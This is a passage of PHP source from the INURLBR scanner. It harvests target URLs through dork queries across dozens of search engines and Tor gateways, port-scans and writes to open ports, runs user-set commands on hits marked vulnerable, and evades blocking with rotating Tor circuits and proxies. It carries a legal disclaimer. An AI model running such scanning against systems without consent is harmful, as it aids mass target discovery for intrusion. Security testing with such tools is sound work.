    $dk[3] = array('aspx', 'asp', 'cfm', 'php', 'php3', 'pl', 'cgi', 'py', 'jsp');

    for ($i = 0; $i <= $_; $i++) {

        $dm = NULL;
        $da = $dk[1][rand(0, count($dk[1]) - 1)];
        $dg = $dk[2][rand(0, count($dk[2]) - 1)];
        $de = $dk[3][rand(0, count($dk[3]) - 1)];

        $__[] = "\"{$dm}/{$da}.{$de}?{$dg}\"";
    }
    return $__;
}

################################################################################
#VALIDATING OPEN DOORS##########################################################
################################################################################
#(PHP 4, PHP 5) fsockopen — Open Internet or Unix domain socket connection
#http://php.net/manual/en/function.fsockopen.php

function __portScan($_) {

    // FORMAT PORTS 80, 8181, 22, 21
    $ports = explode(',', $_[1]);
    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ PROCESS PORT-SCAN ]::\n";
    foreach ($ports as $value) {

        $conc = fsockopen($_SESSION['config']['server_ip'], $value, $_[2], $_[3], 30);
        // HOST, POST, ERROR1, ERROR3, TIMEOUT

        __plus();

        if ($conc) {

            echo "{$_SESSION["c1"]}|_[ + ]__|[ {$value}=\033[1m\033[32mOPEN{$_SESSION["c0"]}";
            (not_isnull_empty($_SESSION['config']['port-write']) ? __portWrite($conc, $_SESSION['config']['port-write']) : NULL);
            __saveValue($_SESSION['config']['arquivo_output'], "{$value}=OPEN", 2);

            __plus();
            $_[0]['url_port'] = $value;
            (not_isnull_empty($_SESSION['config']['port-cmd']) ? __command($_SESSION['config']['port-cmd'], $_[0]) : NULL);
            __plus();
        } else {

            echo "{$_SESSION["c1"]}|_[ x ]__|[ {$value}={$_SESSION["c9"]}CLOSED{$_SESSION["c0"]}\n";
            __plus();
        }
    }
    echo $_SESSION["c0"];
    fclose($conc);
}

################################################################################
#WRITING ON THE DOOR############################################################
################################################################################
#(PHP 4, PHP 5) fwrite — Binary-safe file write
#http://php.net/manual/pt_BR/function.fwrite.php

function __portWrite($conect, $valores) {

    $valores = explode(',', $valores);
    foreach ($valores as $value) {

        echo "{$_SESSION["c1"]}|_[ + ]__|[ WRITE SEND={$value}{$_SESSION["c0"]}\n";
        fwrite($conect, "{$value}\r\n") . sleep(3);
        __plus();
    }
}

################################################################################
#CODE SEARCH ENGINES############################################################
################################################################################
//$_SESSION['config']['cod'] = ' 

function __engines($dork, $list_proxy) {

    $dork_ = (not_isnull_empty($dork)) ? $dork : __getOut("DEFINA SUA DORK\n");
    $list_proxy_ = (!is_null($list_proxy) ? $list_proxy[rand(0, count($list_proxy) - 1)] : NULL);

    $confArray = array("list_proxy_rand" => $list_proxy_, "list_proxy_file" => $list_proxy);

    (!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? __renewTOR() : NULL);

    echo "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c1"]}{{$_SESSION["c0"]} ";

    __plus();

    echo (!is_null($list_proxy_) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ PROXY FILE RANDOM ]:: {$_SESSION["c1"]}[ {$list_proxy_} ]{$_SESSION["c0"]} " : NULL );

################################################################################
# SEARCH ENGINE :::  google
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $randHost = __dominioGoogleRandom();
        $_SESSION["config"]["dork_tmp"] = $dork_;
        $_SESSION["config"]["conf_array_tmp"] = $confArray;
        __pageEngine($confArray, "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $dork_, $postDados, 0, 0, 1);
    }


################################################################################
# SEARCH ENGINE :::  bing
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 2) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "BING", "http://www.bing.com/search?q=[DORK]&&filt=rf&first=[PAG]", $dork_, $postDados, 1, 991, 50);
    }

################################################################################
# SEARCH ENGINE :::  yahoo
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 3) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YAHOO BR", "http://search.yahoo.com/search?p=[DORK]&ei=UTF-8&b=[PAG]", $dork_, $postDados, 1, 471, 10);
    }

################################################################################
# SEARCH ENGINE :::  ask
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 4) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ASK", "http://www.ask.com/web?q=[DORK]&page=[PAG]&qid=[RANDOM]", $dork_, $postDados, 0, 16, 1);
    }

################################################################################
# SEARCH ENGINE :::  hao123
################################################################################


    if (__validateOptions($_SESSION["config"]["motor"], 5) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "HAO123 BR", "http://search.hao123.com.br/s?tn=[RANDOM]&f=0&wd=[DORK]&haobd=[RANDOM]FG=1&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 550, 10);
    }

################################################################################
# SEARCH ENGINE :::  googleapis 
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], 6) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "GOOGLE API", "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q=[DORK]&start=[PAG]&userip=[IP]&filter=1&safe=off", $dork_, $postDados, 0, 56, 4);
    }

################################################################################
# SEARCH ENGINE :::  lycos
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 7) || __validateOptions($_SESSION["config"]["motor"], "all")) {
        $_ = __request_info("http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados);
        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);

        __pageEngine($confArray, "LYCOS", "http://search.lycos.com/web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn=[PAG]", $dork_, $postDados, 0, 24, 1);
    }

################################################################################
# SEARCH ENGINE :::  uol.com.br
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 8) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "UOL BR", "http://busca.uol.com.br/web/?q=[DORK]&start=[PAG]", $dork_, $postDados, 10, 130, 10);
    }

################################################################################
# SEARCH ENGINE :::  us.yhs4.search.yahoo
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 9) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YAHOO US", "http://us.yhs4.search.yahoo.com/yhs/search?p=[DORK]&fr=goodsearch-yhsif&b=[PAG]", $dork_, $postDados, 1, 551, 10);
    }

################################################################################
# SEARCH ENGINE :::  sapo.pt
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 10) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "SAPO", "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page=[PAG]&q=[DORK]&st=web", $dork_, $postDados, 0, 14, 1);
    }

################################################################################
# SEARCH ENGINE :::  dmoz
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 11) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "DMOZ", "http://www.dmoz.org/search/search?q=[DORK]&start=[PAG]&type=next&all=yes&cat=", $dork_, $postDados, 0, 800, 20);
    }

################################################################################
# SEARCH ENGINE :::  gigablast
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 12) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "GIGABLAST", "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q=[DORK]", $dork_, $postDados, 0, 1, 1);
    }

################################################################################
# SEARCH ENGINE :::  web.search.naver.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 13) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "NEVER", "http://web.search.naver.com/search.naver?where=webkr&query=[DORK]&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=[PAG]", $dork_, $postDados, 1, 500, 10);
    }

################################################################################
# SEARCH ENGINE :::  br.baidu.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 14) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "BAIDU BR", "http://www.baidu.com.br/s?usm=1&rn=100&wd=[DORK]&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 1500, 100);
    }

################################################################################
# SEARCH ENGINE :::  www.yandex.ru
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 15) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YANDEX", "http://yandex.ru/yandsearch?text=[DORK]&p=[PAG]&lr=10136", $dork_, $postDados, 0, 30, 1);
    }

################################################################################
# SEARCH ENGINE :::  www.zoo.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 16) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ZOO", "http://www.zoo.com/Zoo-Site/search/web?qsi=[PAG2]&q=[DORK]&p=[PAG]&fcoid=4&fpid=2", $dork_, $postDados, 1, 211, 20, 10);
    }

################################################################################
# SEARCH ENGINE :::  www.hotbot.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 17) || __validateOptions($_SESSION["config"]["motor"], "all")) {
        $_ = __request_info("http://www.hotbot.com/", $_SESSION["config"]["proxy"], $postDados);
        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);
        __pageEngine($confArray, "HOTBOT", "http://www.hotbot.com/search/web?pn=[PAG]web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}", $dork_, $postDados, 0, 24, 1);
    }

################################################################################
# SEARCH ENGINE :::  www.zhongsou.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 18) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ZHONGSOU", "http://www.zhongsou.com/third?w=[DORK]&b=[PAG]", $dork_, $postDados, 1, 50, 1);
    }

################################################################################
# SEARCH ENGINE :::  hksearch.timway.com
################################################################################
    if (__validateOptions($_SESSION["config"]["motor"], 19) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "HKSEARCH", "http://hksearch.timway.com/search.php?query=[DORK]&region=zh-hant-hk&p=[PAG]", $dork_, $postDados, 1, 12, 1);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / USA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION USA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=usa&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / ASIA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION ASIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=asia&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / EUROPA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION EUROPA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=eu&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / INDIA
################################################################################
    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION INDIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=in&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  www.sogou.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 21) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "SOGOU", "http://www.sogou.com/web?query=[DORK]&page=[pag]&ie=utf8", $dork_, $postDados, 1, 20, 1);
    }

################################################################################
# SEARCH ENGINE :::  api.duckduckgo.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 22) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $postDados = TRUE;
        __pageEngine($confArray, "DUCK DUCK GO", "https://api.duckduckgo.com/html/?q=[DORK]&kl=en-us&p=-1&s=[PAG]&dc=[PAG3]&o=json&api=d.js", $dork_, $postDados, 0, 800, 50, 0, 37);
    }

################################################################################
# SEARCH ENGINE :::  boorow
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 23) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $postDados = TRUE;
        __pageEngine($confArray, "BOOROW", "http://boorow.com/Pages/site_br_aspx?query=[DORK]", $dork_, $postDados, 0, 0, 1);
    }

################################################################################
# SEARCH ENGINE ::: Google Generic RANDOM
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 24) || __validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $randHost = __dominioGoogleRandom();
        $randGeneric = __googleGenericRandom();
        __pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}", "http://{$randHost}/cse?cx={$randGeneric}&q=[DORK]&num=500&hl=en&as_qdr=all&start=[PAG]&sa=N", $dork_, $postDados, 0, 5, 1);
    }


#===============================================================================
#===============================================================================
#===============================================================================
#======================[ MOTORES DE BUSCA ESPECIAIS  ]==========================
#===============================================================================
#===============================================================================
#===============================================================================
#===============================================================================
# SEARCH ENGINE :::  ndj6p3asftxboa7j.tor2web.org / Tor find ===================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e1")) {

        __pageEngine("TOR FIND", "https://ndj6p3asftxboa7j.tor2web.org/search.php?search_query=[DORK]&page_num=[PAG]&domainchoice=onion", $dork_, $postDados, 1, 5, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  elephantjmjqepsw.tor2web.org ==============================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e2")) {

        __pageEngine("ELEPHANT", "https://elephantjmjqepsw.tor2web.orgsearch?q=[DORK]&page=[PAG]", $dork_, $postDados, 0, 29, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  kbhpodhnfxl3clb4.tor2web.org ==============================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e3")) {

        __pageEngine("TORSEARCH", "https://kbhpodhnfxl3clb4.tor2web.org/en/search?j=f&page=[PAG]&q=[DORK]&utf8=%E2%9C%93", $dork_, $postDados, 0, 10, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  search.wikileaks.org ======================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e4")) {

        __pageEngine("WIKILEAKS", "https://search.wikileaks.org/?page=[PAG]&q=[DORK]&sort=0#results", $dork_, $postDados, 1, 60, 1);
    }

#===============================================================================
# SEARCH ENGINE ::: oth.net ====================================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e5")) {

        __pageEngine("OTN", "http://oth.net/s/s?q=[DORK]&cl=1&skip=[PAG]", $dork_, $postDados, 1, 211, 20);
    }

#===============================================================================
# SEARCH ENGINE ::: exploits.shodan.io =========================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e6")) {

        __pageEngine("EXPLOITS SHODAN", "https://exploits.shodan.io/?q=[DORK]&p=[PAG]", $dork_, $postDados, 1, 25, 1);
    }

    __plus();
}

################################################################################
#INITIAL INFORMATION############################################################
################################################################################

function __startingBanner() {

    echo "\n{$_SESSION["c1"]}[ ! ] Starting SCANNER INURLBR 2.1 at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c9"]}
[ ! ] legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program{$_SESSION["c0"]}\n";

    $file = not_isnull_empty($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    $command = not_isnull_empty($_SESSION['config']['command-vul']) ? $_SESSION['config']['command-vul'] : $_SESSION['config']['command-all'];
    $subcommand = not_isnull_empty($_SESSION['config']['sub-cmd-vul']) ? $_SESSION['config']['sub-cmd-vul'] : $_SESSION['config']['sub-cmd-all'];

    echo (not_isnull_empty($_SESSION['config']['ifemail']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER EMAIL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifemail']} ]{$_SESSION["c0"]}" : NULL);

    echo (is_array($_SESSION['config']['dork-file']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORK FILE ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-file']} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['dork-rand']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORKS GENERATED ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-rand']} ]{$_SESSION["c0"]}" : NULL);

    echo (is_array($_SESSION['config']['irc']['conf']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ SEND VULN IRC ]::{$_SESSION["c1"]}[ server: {$_SESSION['config']['irc']['conf'][0]} / channel: {$_SESSION['config']['irc']['conf'][1]} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['ifurl']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER URL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifurl']} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($file) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($file_all) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]}[ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($command) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL COMMAND ]::{$_SESSION["c1"]} [ $command ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($subcommand) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL SUB_COMMAND ]::{$_SESSION["c1"]} [ $subcommand ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['proxy-file']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILE SOURCE LIST OF PROXY ]::{$_SESSION["c1"]} [ {$_SESSION['config']['proxy-file']} ]{$_SESSION["c0"]}" : NULL);
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################
################################################################################
# (PHP 4 >= 4.0.1, PHP 5) create_function — Create an anonymous (lambda-style) 
# function http://php.net/manual/en/function.create-function.php

function __main($dork, $motor, $cod) {

    $dork_[0] = (strstr($dork, '[DORK]') ? explode('[DORK]', $dork) : array($dork));
    $dork_[1] = (not_isnull_empty($_SESSION['config']['dork-file']) ? __openFile($_SESSION['config']['dork-file'], 1) : $dork_[0]);
    $dork_[2] = (not_isnull_empty($_SESSION['config']['dork-rand']) ? __randomDork($_SESSION['config']['dork-rand']) : array());
    $dork_[3] = array_filter(array_unique(array_merge($dork_[0], $dork_[1], $dork_[2])));

    $file_proxy = (not_isnull_empty($_SESSION['config']['proxy-file']) ? __openFile($_SESSION['config']['proxy-file'], 1) : NULL);
    $list_proxy = (is_array($file_proxy) ? ($file_proxy) : NULL);

    print __bannerLogo();

    __startingBanner();

    for ($i = 0; $i <= count($dork_[3]); $i++) {

        if (!empty($dork_[3][$i])) {

            echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ DORK ]::{$_SESSION["c1"]}[ {$dork_[3][$i]} ]\n";

            //$objNewSearch = create_function('$dork_, $motor, $list_proxy', $cod);
            //$objNewSearch(urlencode($dork_[3][$i]), $motor, $list_proxy);
		
            __engines(urlencode($dork_[3][$i]), $list_proxy) . __plus();

            ($_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;
            ($_SESSION["config"]["pr"]) ? $_SESSION["config"]["totas_urls"] = NULL : NULL;

            echo "\n";
        }
    }

    (!$_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;

    __exitProcess();
}

################################################################################
#RUN VALIDATION / PROCESSES SCAN RANG IP########################################
################################################################################

if (not_isnull_empty($_SESSION['config']['range']) || not_isnull_empty($_SESSION['config']['range-rand'])) {

    print __bannerLogo();
    __startingBanner();
    not_isnull_empty($_SESSION['config']['range']) ? __process(__generatorRangeIP($_SESSION['config']['range'])) : NULL;
    not_isnull_empty($_SESSION['config']['range-rand']) ? __process(__generatorIPRandom(array(1 => $_SESSION['config']['range-rand']))) : NULL;
    __exitProcess();
}


################################################################################
#RUN VALIDATION / PROCESSES WITH FILE###########################################
################################################################################

if (not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {

    print __bannerLogo();
    __startingBanner();
    __openFile($_SESSION['config']['abrir-arquivo']);
    __plus();
    __exitProcess();
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################
################################################################################

__main($_SESSION['config']['dork'], $_SESSION['config']['motor'], $_SESSION['config']['cod']);

function __extra() {

    $banners = array(
        "{$_SESSION["c1"]}
_ _  _ _  _ ____ _    ___  ____ 
| |\ | |  | |__/ |    |__] |__/ 
| | \| |__| |  \ |___ |__] |  \ 
", "{$_SESSION["c1"]}
 (        )         (    (          (     
 )\ )  ( /(         )\ ) )\ )   (   )\ )  
(()/(  )\())    (  (()/((()/( ( )\ (()/(  
 /(_))((_)\     )\  /(_))/(_)))((_) /(_)) 
(_))   _((_) _ ((_)(_)) (_)) ((_)_ (_))   
|_ _| | \| || | | || _ \| |   | _ )| _ \  
 | |  | .` || |_| ||   /| |__ | _ \|   /  
|___| |_|\_| \___/ |_|_\|____||___/|_|_\ 
 ", "{$_SESSION["c1"]}
.-..-. .-..-. .-..----. .-.   .----. .----. 
| ||  `| || { } || {}  }| |   | {}  }| {}  }
| || |\  || {_} || .-. \| `--.| {}  }| .-. \
`-'`-' `-'`-----'`-' `-'`----'`----' `-' `-' 
     ", "{$_SESSION["c1"]}
 ___ _   _ _   _ ____  _     ____  ____  
|_ _| \ | | | | |  _ \| |   | __ )|  _ \ 
 | ||  \| | | | | |_) | |   |  _ \| |_) |
 | || |\  | |_| |  _ <| |___| |_) |  _ < 
|___|_| \_|\___/|_| \_\_____|____/|_| \_\
", "{$_SESSION["c1"]}
                                     /~\
                                    |oo )      /INURLBR
                                    _\=/_
                    ___        #   /  _  \   #
                   /() \        \\//|/.\|\\//
                 _|_____|_       \/  \_/  \/
                | | === | |         |\ /|
                |_|  O  |_|         \_ _/
                 ||  O  ||          | | |
                 ||__*__||          | | |
                |~ \___/ ~|         []|[]
                /=\ /=\ /=\         | | |
________________[_]_[_]_[_]________/_]_[_\_________________________
", "{$_SESSION["c1"]}
 ______   __  __  __  __  ____    __       ____     ____       
/\__  _\ /\ \/\ \/\ \/\ \/\  _`\ /\ \     /\  _`\  /\  _`\     
\/_/\ \/ \ \ `\\ \ \ \ \ \ \ \L\ \ \ \    \ \ \L\ \\ \ \L\ \   
   \ \ \  \ \ , ` \ \ \ \ \ \ ,  /\ \ \  __\ \  _ <'\ \ ,  /   
    \_\ \__\ \ \`\ \ \ \_\ \ \ \\ \\ \ \L\ \\ \ \L\ \\ \ \\ \  
    /\_____\\ \_\ \_\ \_____\ \_\ \_\ \____/ \ \____/ \ \_\ \_\
    \/_____/ \/_/\/_/\/_____/\/_/\/ /\/___/   \/___/   \/_/\/ /
", "{$_SESSION["c1"]}
 _____ ______  _     _ ______  _       ______ ______  
(_____)  ___ \| |   | (_____ \| |     (____  (_____ \ 
   _  | |   | | |   | |_____) ) |      ____)  )____) )
  | | | |   | | |   | (_____ (| |     |  __  (_____ ( 
 _| |_| |   | | |___| |     | | |_____| |__)  )    | |
(_____)_|   |_|\______|     |_|_______)______/     |_|
", "{$_SESSION["c1"]}
                           ______                                  
                        .-.      .-.                               
                       /            \                              
                      |  [ INURLBR ] |                             
                      |,  .-.  .-.  ,|                             
                      | )(|_/  \|_)( |                             
                      |/     /\     \|                             
              _       (_     ^^     _)                             
      _\ ____) \_______\__|IIIIII|__/_______________________________     
     (_)[___]{}<________|-\IIIIII/-|__INURL__INURL__INURL___________\    
       /     )_/        \          /                               
                         \ ______ / 
", "{$_SESSION["c1"]}
    
88 88b 88 88   88 88**Yb 88     88**Yb 88**Yb
88 88Yb88 88   88 88__dP 88     88__dP 88__dP
88 88 Y88 Y8   8P 88*Yb  88  .o 88**Yb 88*Yb 
88 88  Y8 `YbodP' 88  Yb 88ood8 88oodP 88  Yb
", "{$_SESSION["c1"]}
    
       #                                                
       ##                        ###                    
   ### ###  ##  ###  ##  ####### ###     ####### ####### 
   ### #### ##  ###  ##       ## ###          ##      ##
   ### #######  ###  ##  ######  ###     ######  ###### 
   ### ### ###  ###  ##  ##  ##  ###     ###  ## ##  ## 
   ### ###  ##   #####   ##   ## ####### ######  ##   ##
             #     
", "{$_SESSION["c1"]}
    
 __    __   __    __   _______  __      __    __   __    __   _______  __  
|  |  |  | |  |  |  | |   ____||  |    |  |  |  | |  |  |  | |   ____||  | 
|  |__|  | |  |  |  | |  |__   |  |    |  |__|  | |  |  |  | |  |__   |  | 
|   __   | |  |  |  | |   __|  |  |    |   __   | |  |  |  | |   __|  |  | 
|  |  |  | |  `--'  | |  |____ |__|    |  |  |  | |  `--'  | |  |____ |__| 
|__|  |__|  \______/  |_______|(__)    |__|  |__|  \______/  |_______|(__)                                                                          
", "{$_SESSION["c1"]}
 _            _          
| |__  _ __  | |__  _ __ 
| '_ \| '__| | '_ \| '__|
| |_) | |    | |_) | |   
|_.__/|_|    |_.__/|_| 
", "{$_SESSION["c1"]}
     ___      .__   __. .___________. __   _______    ___      
    /   \     |  \ |  | |           ||  | |   ____|  /   \     
   /  ^  \    |   \|  | `---|  |----`|  | |  |__    /  ^  \    
  /  /_\  \   |  . `  |     |  |     |  | |   __|  /  /_\  \   
 /  _____  \  |  |\   |     |  |     |  | |  |    /  _____  \  
/__/     \__\ |__| \__|     |__|     |__| |__|   /__/     \__\                                                              
", "{$_SESSION["c1"]}
 _____       _                       _           
/  ___|     | |                     (_)          
\ `--. _   _| |____   _____ _ __ ___ ___   _____ 
 `--. \ | | | '_ \ \ / / _ \ '__/ __| \ \ / / _ \
/\__/ / |_| | |_) \ V /  __/ |  \__ \ |\ V /  __/
\____/ \__,_|_.__/ \_/ \___|_|  |___/_| \_/ \___|

", "{$_SESSION["c1"]}
 __     __              _       _ _                       ____  _       _ _        _ 
 \ \   / /_ _ _ __   __| | __ _| (_)___ _ __ ___   ___   |  _ \(_) __ _(_) |_ __ _| |
  \ \ / / _` | '_ \ / _` |/ _` | | / __| '_ ` _ \ / _ \  | | | | |/ _` | | __/ _` | |
   \ V / (_| | | | | (_| | (_| | | \__ \ | | | | | (_) | | |_| | | (_| | | || (_| | |
    \_/ \__,_|_| |_|\__,_|\__,_|_|_|___/_| |_| |_|\___/  |____/|_|\__, |_|\__\__,_|_|
                                                                  |___/              
");
    return ($banners[rand(0, count($banners) - 1)]);
}
